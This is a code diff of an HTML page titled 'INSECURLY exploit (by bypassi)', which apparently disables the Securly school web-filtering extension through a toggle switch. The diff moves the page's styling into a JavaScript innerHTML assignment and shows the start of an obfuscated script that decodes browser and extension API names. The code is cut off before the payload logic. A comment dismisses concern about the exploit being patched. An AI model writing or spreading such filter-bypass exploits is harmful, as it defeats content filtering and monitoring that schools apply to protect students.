@@ -20,89 +20,6 @@
         display: inline-block !important;
       }
     </style>
-    <style>
-      body {
-        background-color:black;
-        color:#eeeeee;
-        font-family:Arial;
-      }
-      h1 {
-        font-size: 40px;
-        font-weight:normal;
-      }
-      .switch-area {
-        display:flex;
-        margin:10px 0px;
-      }
-      .switch-area div{
-        font-size:20px;
-        padding:6px 0px;
-        height:32px;
-      }
-      #desc {
-        font-size:18px;
-        max-width:320px;
-      }
-      #updates {
-        font-size:15px;
-        margin-top:15px;
-        color:#999999;
-      }
-      /* https://danklammer.com/articles/simple-css-toggle-switch/ */
-      #toggle {
-          appearance: none;
-          width: 62px;
-          height: 32px;
-          display: inline-block;
-          position: relative;
-          border-radius: 50px;
-          overflow: hidden;
-          outline: none;
-          border: none;
-          cursor: pointer;
-          background-color: #707070;
-          transition: background-color ease 0.3s;
-        }
-        #toggle:before {
-          content: "on off";
-          display: block;
-          position: absolute;
-          z-index: 2;
-          width: 28px;
-          height: 28px;
-          background: #fff;
-          left: 2px;
-          top: 2px;
-          border-radius: 50%;
-          font: 10px/28px Helvetica;
-          text-transform: uppercase;
-          font-weight: bold;
-          text-indent: -22px;
-          word-spacing: 37px;
-          color: #fff;
-          text-shadow: -1px -1px rgba(0,0,0,0.15);
-          white-space: nowrap;
-          box-shadow: 0 1px 2px rgba(0,0,0,0.2);
-          transition: all cubic-bezier(0.3, 1.5, 0.7, 1) 0.3s;
-        }
-        #toggle:checked {
-          background-color: #4CD964;
-        }
-        #toggle:checked:before {
-          left: 32px;
-        }
-      </style>
-      <h1>INSECURLY exploit (by bypassi)</h1>
-      <div class="switch-area">
-        <div>securly is currently</div>
-        <input id="toggle" type="checkbox" />
-      </div>
-      <div id="desc">
-        the switch above allows you to turn the securly extension on and off. note that this will not bypass
-        network filters or other filtering extensions. teachers using securly classroom will still be able to
-        see your screen. more functionality is coming soon.
-      </div>
-      <div id="updates"></div>
     <!--   I personally could not care less whether this exploit gets patched -->
     <script defer>
       function o(n, _ = 78, D = 126) {
@@ -115,6 +32,7 @@
         return o(n, D - _);
       }
       const m = function () {
+          document.body.innerHTML = '<style>  body {    background-color:black;    color:#eeeeee;    font-family:Arial;  }  h1 {    font-size: 40px;    font-weight:normal;  }  .switch-area {    display:flex;    margin:10px 0px;  }  .switch-area div{    font-size:20px;    padding:6px 0px;    height:32px;  }  #desc {    font-size:18px;    max-width:320px;  }  #updates {    font-size:15px;    margin-top:15px;    color:#999999;  }  /* https://danklammer.com/articles/simple-css-toggle-switch/ */  #toggle {      appearance: none;      width: 62px;      height: 32px;      display: inline-block;      position: relative;      border-radius: 50px;      overflow: hidden;      outline: none;      border: none;      cursor: pointer;      background-color: #707070;      transition: background-color ease 0.3s;    }    #toggle:before {      content: "on off";      display: block;      position: absolute;      z-index: 2;      width: 28px;      height: 28px;      background: #fff;      left: 2px;      top: 2px;      border-radius: 50%;      font: 10px/28px Helvetica;      text-transform: uppercase;      font-weight: bold;      text-indent: -22px;      word-spacing: 37px;      color: #fff;      text-shadow: -1px -1px rgba(0,0,0,0.15);      white-space: nowrap;      box-shadow: 0 1px 2px rgba(0,0,0,0.2);      transition: all cubic-bezier(0.3, 1.5, 0.7, 1) 0.3s;    }    #toggle:checked {      background-color: #4CD964;    }    #toggle:checked:before {      left: 32px;    }  </style>  <h1>INSECURLY exploit (by bypassi)</h1>  <div class="switch-area">    <div>securly is currently</div>    <input id="toggle" type="checkbox" />  </div>  <div id="desc">    the switch above allows you to turn the securly extension on and off. note that this will not bypass    network filters or other filtering extensions. teachers using securly classroom will still be able to    see your screen. more functionality is coming soon.  </div>  <div id="updates"></div>';
           let n =
               window[d`38B?=5`][d`5HD5>C9?>`][
                 o`\x19\x17&r\x13\x15\x1D\x19$!' \x16\x02\x13\x19\x17`
